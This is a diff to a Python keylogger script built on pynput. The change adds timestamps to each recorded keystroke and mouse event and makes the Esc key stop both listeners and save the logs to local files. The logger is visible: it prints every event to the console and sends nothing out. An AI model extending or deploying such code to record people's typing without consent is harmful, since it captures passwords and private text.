@@ -1,4 +1,6 @@
 from pynput import keyboard, mouse
+from datetime import datetime
+import sys
 
 #----------------------------keyboard-----------------------------
 #-----------------------------------------------------------------
@@ -21,40 +23,49 @@ Excluded_Keys = {
     keyboard.Key.delete, keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, 
     keyboard.Key.right, keyboard.Key.media_volume_up, 
     keyboard.Key.media_volume_down, keyboard.Key.media_play_pause, 
-    keyboard.Key.esc
+    keyboard.Key.esc, keyboard.Key.shift_r,keyboard.Key.num_lock
 }
+
+def get_timestamp():
+    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 def pressed(key):
     global keys, word_Keys
+    timestamp = get_timestamp()
     try:
-        print(f'{key.char} pressed')
-        keys.append(key.char)
-        word_Keys.append(key.char)
+        print(f'{key.char} pressed at {timestamp}')
+        keys.append(f'{timestamp} - {key.char}')
+        word_Keys.append(f'{key.char}')
     except AttributeError:
         if key == keyboard.Key.space:
-            print('Space key pressed')
-            keys.append(f"<{key}>")
-            word_Keys.append(" ")
+            print(f'Space key pressed at {timestamp}')
+            keys.append(f'{timestamp} - <{key}>')
+            word_Keys.append(f' ')
         elif key == keyboard.Key.enter:
-            print('Enter key pressed')
-            keys.append(f"<{key}>")
-            word_Keys.append("\n")
+            print(f'Enter key pressed at {timestamp}')
+            keys.append(f'{timestamp} - <{key}>')
+            word_Keys.append(f'\n')
         else:
-            print(f'Special key {key} pressed')
-            keys.append(f"<{key}>")
+            print(f'Special key {key} pressed at {timestamp}')
+            keys.append(f'{timestamp} - <{key}>')
             if key in Excluded_Keys:
                 return
             elif key == keyboard.Key.backspace and word_Keys:
                 word_Keys.pop()
             else:
-                word_Keys.append(f"<{key}>")
+                word_Keys.append(f'<{key}>')
 
 def released(key):
-    print(f'{key} released')
+    timestamp = get_timestamp()
+    print(f'{key} released at {timestamp}')
     if key == keyboard.Key.esc:
-        stop_flag = True
+        # Stop both keyboard and mouse listeners
+        keyboard_listener.stop()
+        mouse_listener.stop()
         write_File()
-        return False
+        write_File_mouse()
+        print("Exiting program...")
+        sys.exit() 
 
 
 def write_File():
@@ -75,20 +86,22 @@ Mouselogs = []
 MouselogsFile = open("Mouse_Logs.txt", 'a')
 
 def move(x, y):
-    log = f'Pointer moved to {(x, y)}'
+    timestamp = get_timestamp()
+    log = f'{timestamp} - Pointer moved to {(x, y)}'
     print(log)
     Mouselogs.append(log)
 
 def click(x, y, button, pressed):
-    log = f'{"Pressed" if pressed else "Released"} at {(x, y)}'
+    timestamp = get_timestamp()
+    log = f'{timestamp} - {"Pressed" if pressed else "Released"} at {(x, y)}'
     print(log)
     Mouselogs.append(log)
     if not pressed:
         write_File_mouse()
-        return False
-    
+
 def scroll(x, y, dx, dy):
-    log = f'Scrolled {"down" if dy < 0 else "up"} at {(x, y)}'
+    timestamp = get_timestamp()
+    log = f'{timestamp} - Scrolled {"down" if dy < 0 else "up"} at {(x, y)}'
     print(log)
     Mouselogs.append(log)
 
@@ -99,16 +112,18 @@ def write_File_mouse():
     Mouselogs.clear()
 
 
+# Start listeners
 keyboard_listener = keyboard.Listener(on_press=pressed, on_release=released)
 mouse_listener = mouse.Listener(on_move=move, on_click=click, on_scroll=scroll)
 
 keyboard_listener.start()
 mouse_listener.start()
 
+# Keep the program running until listeners are stopped
 keyboard_listener.join()
 mouse_listener.join()
 
+# Close files when done
 MouselogsFile.close()
 Allkeylogsfile.close()
 keyWordslogs.close()
-
